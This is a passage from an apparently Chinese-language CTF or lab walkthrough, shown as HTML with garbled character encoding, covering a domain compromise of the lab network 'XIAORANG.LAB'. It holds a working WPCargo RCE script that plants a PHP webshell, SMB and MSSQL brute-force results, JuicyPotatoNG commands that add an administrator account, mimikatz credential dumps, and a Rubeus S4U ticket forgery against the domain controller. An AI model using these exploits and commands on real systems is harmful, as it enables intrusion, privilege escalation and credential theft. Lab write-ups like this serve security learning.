SMBè®¤è¯æˆåŠŸ 172.22.2.16:445 admin:admin123</span><br><span class="hljs-string">[11.7s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass:123456 å…±äº«:[print$ IPC$]</span><br><span class="hljs-string">[11.8s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass:root å…±äº«:[print$ IPC$]</span><br><span class="hljs-string">[11.8s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass: å…±äº«:[print$ IPC$]</span><br><span class="hljs-string">[11.9s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass:admin123 å…±äº«:[print$ IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.16:445 admin Pass:root å…±äº«:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.16:445 admin Pass:123456 å…±äº«:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass:admin å…±äº«:[print$ IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass:pass123 å…±äº«:[print$ IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass:Password å…±äº«:[print$ IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.16:445 admin Pass:admin å…±äº«:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.16:445 admin Pass:admin123 å…±äº«:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.2s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.16:445 admin Pass:pass123 å…±äº«:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.2s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.16:445 admin Pass:pass@123 å…±äº«:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.2s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.16:445 admin Pass:P@ssword123 å…±äº«:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.3s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass:pass@123 å…±äº«:[print$ IPC$]</span><br><span class="hljs-string">[12.3s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.16:445 admin Pass:Password å…±äº«:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.3s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.16:445 admin Pass:password å…±äº«:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.4s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass:password å…±äº«:[print$ IPC$]</span><br><span class="hljs-string">[14.0s] [+] Redis 172.22.2.7:6379 å‘ç°æœªæˆæƒè®¿é—® æ–‡ä»¶ä½ç½®:/usr/local/redis/db/dump.rdb</span><br><span class="hljs-string">[14.0s] [+] Redisæ— å¯†ç è¿æ¥æˆåŠŸ: 172.22.2.7:6379</span><br><span class="hljs-string">[55.4s]     æ‰«æå·²å®Œæˆ: 37/37 </span><br></code></pre></td></tr></table></figure><p>æœ‰ä»¥ä¸‹èµ„äº§</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">172.22.2.3DC<br>172.22.2.16MSSQLSERVER<br>172.22.2.18UBUNTU-WEB02<br>172.22.2.34CLIENT01<br></code></pre></td></tr></table></figure><p>å…ˆçœ‹ 172.22.2.18 ï¼Œæœ‰ web æœåŠ¡ï¼Œç”¨äº† WordPressï¼Œwpscan æ‰«</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs sh">[+] Headers<br> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://172.22.2.18/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://172.22.2.18/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://172.22.2.18/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://172.22.2.18/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://172.22.2.18/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;<br> |  - http://172.22.2.18/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentytwentytwo<br> | Location: http://172.22.2.18/wp-content/themes/twentytwentytwo/<br> | Last Updated: 2025-04-15T00:00:00.000Z<br> | Readme: http://172.22.2.18/wp-content/themes/twentytwentytwo/readme.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 2.0<br> | Style URL: http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2<br> | Style Name: Twenty Twenty-Two<br> | Style URI: https://wordpress.org/themes/twentytwentytwo/<br> | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: <span class="hljs-string">&#x27;Version: 1.2&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] wpcargo<br> | Location: http://172.22.2.18/wp-content/plugins/wpcargo/<br> | Last Updated: 2025-07-23T01:11:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 8.0.2<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 6.x.x (80% confidence)<br> | Found By: Readme - Stable Tag (Aggressive Detection)<br> |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt<br></code></pre></td></tr></table></figure><p>WordPress çš„æ’ä»¶ wpcargo æœ‰é—®é¢˜ï¼Œ<a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/">WPCargo &lt; 6.9.0 - Unauthenticated RCE</a>ï¼Œæ‰¾åˆ° poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># This is a magic string that when treated as pixels and compressed using the png</span><br><span class="hljs-comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span><br>payload = <span class="hljs-string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_character_code</span>(<span class="hljs-params">c: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c).replace(<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>)<br><br>text = <span class="hljs-string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> binascii.unhexlify(payload)])[<span class="hljs-number">1</span>:]<br><br>destination_url = <span class="hljs-string">&#x27;http://172.22.2.18/&#x27;</span><br>cmd = <span class="hljs-string">&#x27;ls&#x27;</span><br><br><span class="hljs-comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span><br>requests.get(<br>    <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span class="hljs-subst">&#123;text&#125;</span>&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span><br>)<br><br><span class="hljs-comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span><br><span class="hljs-built_in">print</span>(requests.post(<br>    <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;destination_url&#125;</span>webshell.php?1=system&quot;</span>, data=&#123;<span class="hljs-string">&quot;2&quot;</span>: cmd&#125;<br>).content.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥ï¼Œåœ¨ wp-config.php æ‰¾åˆ°æ•°æ®åº“çš„é…ç½®</p><p><img src="https://img.dkdun.cn/v1/2025/12/920fe2a583f41158.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">wpuser:</span>WpuserEha8Fgj9<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/087e9e261bb93ee3.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;c757e423-eb44-<span class="hljs-number">459</span>c-<span class="hljs-number">9</span>c63-<span class="hljs-number">7625009910</span>d8&#125;<br></code></pre></td></tr></table></figure><h1 id="mssql-çˆ†ç ´"><a href="#mssql-çˆ†ç ´" class="headerlink" title="mssql çˆ†ç ´"></a>mssql çˆ†ç ´</h1><p>æŠŠ f1aagggghere ä¸‹çš„ S0meth1ng_y0u_m1ght_1ntereSted æ•°æ®å¯¼å‡ºæ¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/1efa5890ec13fd39.png"></p><p>é‡Œé¢æœ‰ id å’Œ password</p><p>å¯¹ 172.22.2.16 è¿›è¡Œçˆ†ç ´ï¼Œæ‹¿åˆ°å¯†ç  ElGNkOiC</p><p><img src="https://img.dkdun.cn/v1/2025/12/a7a91c5715281571.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">sa:</span>ElGNkOiC<br></code></pre></td></tr></table></figure><p>ç”¨èšå‰‘èƒ½è¿æ¥ä¸Šï¼Œä½†æ˜¯æ²¡æœ‰æ•°æ®ï¼Œç”¨ <strong><a href="https://github.com/SafeGroceryStore/MDUT">MDUT</a></strong> è¿æ¥ï¼Œåªæœ‰ mssqlserver æƒé™</p><p><img src="https://img.dkdun.cn/v1/2025/12/baaaa6801e726a4f.png"></p><p>ç›´æ¥æ·»åŠ ç”¨æˆ·ä¸è¡Œçš„ï¼ŒæŸ¥çœ‹ç‰¹æƒ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">whoami /priv<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ab1d017eb02f3836.png"></p><p>å‘ç°å¼€å¯äº† <code>SeImpersonatePrivilege</code> ç‰¹æƒï¼Œé‚£ä¹ˆå°±èƒ½æƒ³åˆ°å¯ä»¥ç”¨åœŸè±†ææƒï¼Œ<a href="https://www.cnblogs.com/kqdssheng/p/18738762">Windows ææƒ-SeImpersonatePrivilege ç‰¹æƒ</a>ï¼Œä¸Šä¼ åˆ°æœºå™¨ä¸­</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-type">C</span>:\è¿…é›·ä¸‹è½½\<span class="hljs-type">JuicyPotatoNG</span>.exe -t * -p <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span> -a <span class="hljs-string">&quot;/c whoami &gt; C:\è¿…é›·ä¸‹è½½\butt3rf1y.txt&quot;</span> &amp; <span class="hljs-keyword">type</span> <span class="hljs-type">C</span>:\è¿…é›·ä¸‹è½½\butt3rf1y.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/3c4a30ce5a4dd888.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">C:\è¿…é›·ä¸‹è½½\<span class="hljs-title">JuicyPotatoNG.exe</span> -<span class="hljs-title">t</span> * -<span class="hljs-title">p</span> &quot;<span class="hljs-title">C</span>:\<span class="hljs-title">windows</span>\<span class="hljs-title">system32</span>\<span class="hljs-title">cmd.exe</span>&quot; -<span class="hljs-title">a</span> &quot;/<span class="hljs-title">c</span> <span class="hljs-title">net</span> <span class="hljs-title">user</span> <span class="hljs-title">butt3rf1y</span> <span class="hljs-title">butt3rf1y</span> /<span class="hljs-title">add</span> &gt; <span class="hljs-title">C</span>:\è¿…é›·ä¸‹è½½\<span class="hljs-title">butt3rf1y.txt</span>&quot; &amp; <span class="hljs-title">type</span> <span class="hljs-title">C</span>:\è¿…é›·ä¸‹è½½\<span class="hljs-title">butt3rf1y.txt</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\è¿…é›·ä¸‹è½½\<span class="hljs-title">JuicyPotatoNG.exe</span> -<span class="hljs-title">t</span> * -<span class="hljs-title">p</span> &quot;<span class="hljs-title">C</span>:\<span class="hljs-title">windows</span>\<span class="hljs-title">system32</span>\<span class="hljs-title">cmd.exe</span>&quot; -<span class="hljs-title">a</span> &quot;/<span class="hljs-title">c</span> <span class="hljs-title">net</span> <span class="hljs-title">localgroup</span> <span class="hljs-title">administrators</span> <span class="hljs-title">butt3rf1y</span> /<span class="hljs-title">add</span> &gt; <span class="hljs-title">C</span>:\è¿…é›·ä¸‹è½½\<span class="hljs-title">butt3rf1y.txt</span>&quot; &amp; <span class="hljs-title">type</span> <span class="hljs-title">C</span>:\è¿…é›·ä¸‹è½½\<span class="hljs-title">butt3rf1y.txt</span></span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/718bd6d23f0efef1.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag03</span>: flag&#123;<span class="hljs-number">44</span>e05a29-<span class="hljs-number">8554</span>-<span class="hljs-number">4</span>b0a-<span class="hljs-number">85</span>c6-ec3811ef6199&#125;<br></code></pre></td></tr></table></figure><h1 id="S4U-ä¼ªé€ æƒé™-ST-æ‹¿ä¸‹åŸŸæ§"><a href="#S4U-ä¼ªé€ æƒé™-ST-æ‹¿ä¸‹åŸŸæ§" class="headerlink" title="S4U ä¼ªé€ æƒé™ ST æ‹¿ä¸‹åŸŸæ§"></a>S4U ä¼ªé€ æƒé™ ST æ‹¿ä¸‹åŸŸæ§</h1><p>minikatz æŠ“ hash</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/b42c3fa3d89fe428.png"></p><p>å‘ç°æœ‰åŸŸå†…ç”¨æˆ· William åŠå…¶ä¿¡æ¯ï¼Œä½†æ˜¯ç™»å½•ä¸ä¸Šå»</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">283669</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">00045415</span>)<br>Session           : Interactive from <span class="hljs-number">1</span><br>User Name         : William<br>Domain            : XIAORANG<br>Logon Server      : DC<br>Logon <span class="hljs-built_in">Time</span>        : <span class="hljs-number">2025</span>/<span class="hljs-number">8</span>/<span class="hljs-number">13</span> <span class="hljs-number">17</span>:<span class="hljs-number">49</span>:<span class="hljs-number">06</span><br>SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2704639352</span>-<span class="hljs-number">1689326099</span>-<span class="hljs-number">2164665914</span>-<span class="hljs-number">1106</span><br>        msv :<br>         [<span class="hljs-number">00000003</span>] Primary<br>         * Username : William<br>         * Domain   : XIAORANG<br>         * NTLM     : <span class="hljs-number">8853911</span>fd59e8d0a82176e085a2157de<br>         * SHA1     : e4fd18cfd47b9a77836c82283fb560e6f465bc40<br>         * DPAPI    : da3fc187c1ff105853ec62c10cddd26b<br>        tspkg :<br>        wdigest :<br>         * Username : William<br>         * Domain   : XIAORANG<br>         * Password : (null)<br>        kerberos :<br>         * Username : William<br>         * Domain   : XIAORANG.LAB<br>         * Password : Willg1UoO6Jt<br>        ssp :<br>        credman :<br></code></pre></td></tr></table></figure><p>ä»¥åŠåŸŸå†… MSSQLSERVER$ ç”¨æˆ·</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">8099440</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">007</span>b9670)<br>Session           : Interactive from <span class="hljs-number">4</span><br>User Name         : DWM-<span class="hljs-number">4</span><br>Domain            : Window Manager<br>Logon Server      : (null)<br>Logon <span class="hljs-built_in">Time</span>        : <span class="hljs-number">2025</span>/<span class="hljs-number">8</span>/<span class="hljs-number">13</span> <span class="hljs-number">20</span>:<span class="hljs-number">19</span>:<span class="hljs-number">01</span><br>SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">90</span>-<span class="hljs-number">0</span>-<span class="hljs-number">4</span><br>        msv :<br>         [<span class="hljs-number">00000003</span>] Primary<br>         * Username : MSSQLSERVER$<br>         * Domain   : XIAORANG<br>         * NTLM     : aca5ebbdd95f1c76b5d201c37d3d345b<br>         * SHA1     : <span class="hljs-number">41</span>ef4222b0a2dd8b549ec6b9fe8de87cd6eff68e<br>        tspkg :<br>        wdigest :<br>         * Username : MSSQLSERVER$<br>         * Domain   : XIAORANG<br>         * Password : (null)<br>        kerberos :<br>         * Username : MSSQLSERVER$<br>         * Domain   : xiaorang.lab<br>         * Password : <span class="hljs-number">9</span>a <span class="hljs-number">5</span>a <span class="hljs-number">6</span>d e6 da f8 de b8 <span class="hljs-number">91</span> <span class="hljs-number">89</span> <span class="hljs-number">0</span>c f7 <span class="hljs-number">70</span> <span class="hljs-number">8</span>d ec <span class="hljs-number">42</span> <span class="hljs-number">05</span> c5 a0 <span class="hljs-number">5</span>f c3 <span class="hljs-number">46</span> <span class="hljs-number">3</span>b <span class="hljs-number">37</span> bf <span class="hljs-number">50</span> c9 <span class="hljs-number">2</span>f <span class="hljs-number">9</span>e b0 <span class="hljs-number">94</span> dd <span class="hljs-number">8</span>a <span class="hljs-number">06</span> <span class="hljs-number">8</span>b <span class="hljs-number">15</span> a2 e0 <span class="hljs-number">4</span>d f9 e9 <span class="hljs-number">34</span> <span class="hljs-number">3</span>d <span class="hljs-number">3</span>a eb ef <span class="hljs-number">9</span>c <span class="hljs-number">53</span> <span class="hljs-number">6</span>a a5 <span class="hljs-number">4</span>a c9 <span class="hljs-number">2</span>e <span class="hljs-number">86</span> <span class="hljs-number">7</span>f d7 <span class="hljs-number">92</span> <span class="hljs-number">6</span>e <span class="hljs-number">76</span> <span class="hljs-number">46</span> <span class="hljs-number">04</span> <span class="hljs-number">03</span> <span class="hljs-number">18</span> <span class="hljs-number">9</span>d <span class="hljs-number">8</span>c <span class="hljs-number">6</span>f fd <span class="hljs-number">7</span>e d2 <span class="hljs-number">7</span>b a6 <span class="hljs-number">34</span> b6 <span class="hljs-number">69</span> <span class="hljs-number">2</span>b c1 <span class="hljs-built_in">cd</span> <span class="hljs-number">94</span> <span class="hljs-number">3</span>e <span class="hljs-number">95</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>d ff ad <span class="hljs-number">24</span> <span class="hljs-number">8</span>b <span class="hljs-number">15</span> e0 <span class="hljs-number">83</span> <span class="hljs-number">99</span> dc <span class="hljs-number">4</span>b <span class="hljs-number">8</span>d fd a5 d5 <span class="hljs-number">54</span> <span class="hljs-number">62</span> <span class="hljs-number">0</span>c dd fc <span class="hljs-number">9</span>c <span class="hljs-number">8</span>e <span class="hljs-number">8</span>a <span class="hljs-number">86</span> <span class="hljs-number">9</span>f ad <span class="hljs-number">91</span> <span class="hljs-number">8</span>d <span class="hljs-number">41</span> <span class="hljs-number">1</span>f <span class="hljs-number">9</span>c <span class="hljs-number">37</span> e0 <span class="hljs-number">86</span> db ff b7 c2 ae <span class="hljs-number">81</span> <span class="hljs-number">68</span> ec <span class="hljs-number">58</span> <span class="hljs-number">8</span>e <span class="hljs-number">64</span> <span class="hljs-number">01</span> cf <span class="hljs-number">8</span>d aa b5 <span class="hljs-number">45</span> <span class="hljs-number">96</span> <span class="hljs-number">2</span>b <span class="hljs-number">0</span>c eb <span class="hljs-number">76</span> <span class="hljs-number">72</span> <span class="hljs-number">01</span> <span class="hljs-number">57</span> <span class="hljs-number">03</span> <span class="hljs-number">26</span> <span class="hljs-number">54</span> <span class="hljs-number">2</span>a <span class="hljs-number">0</span>a f7 <span class="hljs-number">38</span> cb da <span class="hljs-number">8</span>c <span class="hljs-number">73</span> <span class="hljs-number">32</span> ac <span class="hljs-number">12</span> c6 <span class="hljs-number">71</span> <span class="hljs-number">50</span> <span class="hljs-number">3</span>c e9 <span class="hljs-number">7</span>a <span class="hljs-number">3</span>e <span class="hljs-number">46</span> <span class="hljs-number">3</span>e <span class="hljs-number">4</span>e d8 <span class="hljs-number">75</span> d3 d4 b7 e4 <span class="hljs-number">23</span> <span class="hljs-number">8</span>e <span class="hljs-number">37</span> <span class="hljs-number">02</span> b5 <span class="hljs-number">68</span> a1 <span class="hljs-number">10</span> cc <span class="hljs-number">7</span>c f9 <span class="hljs-number">3</span>c <span class="hljs-number">37</span> b5 a1 <span class="hljs-number">3</span>b <span class="hljs-number">14</span> <span class="hljs-number">7</span>c dc <span class="hljs-number">81</span> <span class="hljs-number">64</span> <span class="hljs-number">9</span>e <span class="hljs-number">09</span> b5 <span class="hljs-number">85</span> <span class="hljs-number">22</span> <span class="hljs-number">85</span> b4 <span class="hljs-number">1</span>b d9 <span class="hljs-number">4</span>f f4 a9 e2 <span class="hljs-number">1</span>a <span class="hljs-number">57</span> <span class="hljs-number">25</span> <span class="hljs-number">1</span>f f2 ad <span class="hljs-number">7</span>c ee da <span class="hljs-built_in">cd</span> <span class="hljs-number">2</span>b <span class="hljs-number">1</span>a ab <span class="hljs-number">76</span> ba <span class="hljs-number">76</span> <span class="hljs-number">5</span>a <span class="hljs-number">3</span>d <span class="hljs-number">8</span>e e9 ea c2 d3 <span class="hljs-number">8</span>a <span class="hljs-number">87</span> <span class="hljs-number">53</span> <span class="hljs-number">84</span> d6 <span class="hljs-number">4</span>e <span class="hljs-number">7</span>e <span class="hljs-number">55</span> <span class="hljs-number">6</span>d <span class="hljs-number">9</span>e fe <span class="hljs-number">36</span> e6<br>        ssp :<br>        credman :<br><br></code></pre></td></tr></table></figure><p>dump åŸŸä¿¡æ¯å¹¶æŸ¥çœ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains bloodhound-python -d XIAORANG.LAB -u <span class="hljs-string">&#x27;MSSQLSERVER$&#x27;</span> --hashes aca5ebbdd95f1c76b5d201c37d3d345b:aca5ebbdd95f1c76b5d201c37d3d345b -dc DC.XIAORANG.LAB -c all -ns 172.22.2.3 --dns-tcp --zip<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/4a988b83fbca73b8.png"></p><p>å¯ä»¥é€šè¿‡ S4U ä¼ªé€  ST æ‹¿ä¸‹åŸŸæ§ï¼Œç”¨ Rubeus ç”³è¯·è®¿é—®è‡ªèº«çš„æœåŠ¡ç¥¨æ®ï¼Œæ‹¿åˆ°ç¥¨æ®ï¼Œæ³¨å…¥ç¥¨æ®ï¼Œä¸€æ­¥åˆ°ä½</p><p><img src="https://img.dkdun.cn/v1/2025/12/b0a2416dce67f1b4.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">.\Rubeus.exe s4u /user:MSSQLSERVER$ /rc4:aca5ebbdd95f1c76b5d201c37d3d345b /domain:xiaorang.lab /dc:DC.xiaorang.lab  /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /ptt<br></code></pre></td></tr></table></figure><p>è¿›å…¥åŸŸæ§ç›®å½•ï¼ŒWindows æ–‡ä»¶å…±äº«çš„ UNC è·¯å¾„</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">\\DC.xiaorang.lab\C$\Users\Administrator\flag<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/dd9be6a17794b7bb.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 